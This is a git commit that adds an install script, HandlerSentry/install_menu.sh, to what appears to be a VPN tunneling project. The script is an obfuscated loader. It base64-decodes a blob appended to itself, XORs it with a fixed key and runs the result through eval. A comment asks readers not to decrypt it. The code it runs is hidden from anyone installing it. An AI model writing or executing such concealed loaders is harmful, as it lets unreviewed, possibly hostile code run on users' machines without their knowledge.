3c98c5008e325af7154ea99ec2b00b7f21a246a7
ianlunatix <scriptsvpnlt@gmail.com>
2025-10-02 11:54:55 +0700

    Add files via upload

---
+++ HandlerSentry/install_menu.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+# Jangan Di Decrypt Dong Puuhhh || Lunatic Tunneling || Bandung Barat , Indonesia|| Encrypted shell - obfuscated XOR + base64 loader
+_kk=123
+_dd=$(tail -n +10 "$0")
+_zz=$(echo "$_dd" | base64 -d | perl -pe 's/(.)/chr(ord($1)^'"$_kk"')/eg')
+eval "$_zz"
+exit 0
+#==BEGIN==
+WFpUGRIVVBkaCBMKWDYeFRwOFR8OE1sfGhVbFh4VHB4QCA8JGhBbFh4VDlUBEgsKGgsPWw4LHxoP
+HltWAgoaCw9bEhUIDxoXF1tWAlsOFQESCwpbW1tbDBweD1sTDw8LCEFUVAkaDFUcEg8TDhkOCB4J
+GBQVDx4VD1UYFBZUEhoVFw4VGg8SA1QfExILHlQWGhIVVDMaFR8XHgkoHhUPCQJUNw4VGg8SIyQI
+EwpbW1tbDhUBEgtbNw4VGg8SIyQIEwpbW1tbGBMWFB9bUANbFh4VDlRRCltbW1sWDVsWHhUOVFFb
+VA4ICVQXFBgaF1QIGRIVCltbW1sJFltWCR1bFh4VDgpbW1tbCRZbVgkdWzcOFRoPEiMkCBMKW1tb
+WwwcHg9bEw8PCwhBVFQJGgxVHBIPEw4ZDggeCRgUFQ8eFQ9VGBQWVBIaFRcOFRoPEgNUHxMSCx5U
+FhoSFVQzGhUfFx4JKB4VDwkCVDcOFRoPEiMkCwIKW1tbWw4VARILWzcOFRoPEiMkCwIKW1tbWxgT
+FhQfW1ADWxYeFQ5UUQpbW1tbFg1bFh4VDlRRW1QOCAlUGRIVCltbW1sJFltWCR1bFh4VDgpbW1tb
+CRZbVgkdWzcOFRoPEiMkCwIK
